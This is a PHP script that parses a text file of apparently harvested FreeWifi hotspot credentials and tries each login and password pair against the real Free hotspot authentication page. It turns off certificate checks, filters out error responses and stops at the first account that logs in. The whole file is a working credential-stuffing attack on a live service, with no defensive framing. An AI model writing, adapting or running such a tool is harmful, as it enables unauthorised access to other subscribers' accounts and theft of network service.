<?php
$codes=array();
$fp=fopen('freewifi_codes.txt', 'r');
$next=false;
$l='(?:id|Id|ID|identifiants|IDDfree wifi)';
$p='(?:mp|Mp|MP|Mot de passe|MDP|Mdp|mdp|Mot de passe|mot de pass|pass|M)';
$sep='(?:[:=;])?';
$login='';
$pass='';
$line=0;
while(!feof($fp)) {
	$data=fgets($fp, 4096);
	$line++;
	$data=trim($data);
	if(empty($data)) continue;
	if(strpos($data, '@')!==false) continue;
	if(!$next)
	{
		if(preg_match('/'.$l.'\s*'.$sep.'\s*([0-9]+)(?: Acces refuse pour non paiement)?$/', $data, $matches))
		{
			$login=$matches[1];
			$next=true;
		}
		elseif(preg_match('/([0-9]+)\s*'.$p.'\s*'.$sep.'\s*([0-9a-zA-Z._]+)/', $data, $matches))
		{
			$login=$matches[1];
			$pass=$matches[2];
			$codes[]=array($login, $pass);
			$next=false;
		}
		else {
			var_dump($line, $data);
			var_dump($codes[count($codes)-1]);
			die();
		}
	}
	elseif($next)
	{
		if(preg_match('/'.$p.'\s*'.$sep.'\s*([0-9a-zA-Z._]+)$/', $data, $matches))
		{
			$pass=$matches[1];
			$codes[]=array($login, $pass);
			$next=false;
		}
		else {
			var_dump($line, $data);
			var_dump($codes[count($codes)-1]);
			die();
		}
	}
}
$url='https://wifi.free.fr/Auth';
$c=0;
foreach($codes as list($login, $pass))
{
	$c++;
	$content=sprintf('login=%s&password=%s&submit=Valider', $login, $pass);
	$opts = array(
		'http' => array(
			'method'=>'POST',
			'content'=>$content,
			'header'=>'Content-Type: application/x-www-form-urlencoded',
		),
		'ssl' => array(
			'verify_peer'=>false,
			'allow_self_signed'=>true,
		),
	);
	$opt=stream_context_create($opts);
	$data=file_get_contents($url, false, $opt);
	if(strpos($data, 'ERREUR : VOUS ETES DEJA CONNECTE')!==false)
	{
		continue;
	}
	if(strpos($data, 'Erreur d\'authentification FreeWifi')!==false)
	{
		continue;
	}
	if(strpos($data, 'Identifiant FreeWifi inconnu')!==false)
	{
		continue;
	}
	if(strpos($data, 'Erreur interne')!==false)
	{
		continue;
	}
	echo $data;
	var_dump($login, $pass);
	break;
}
var_dump($c);
echo 'fini';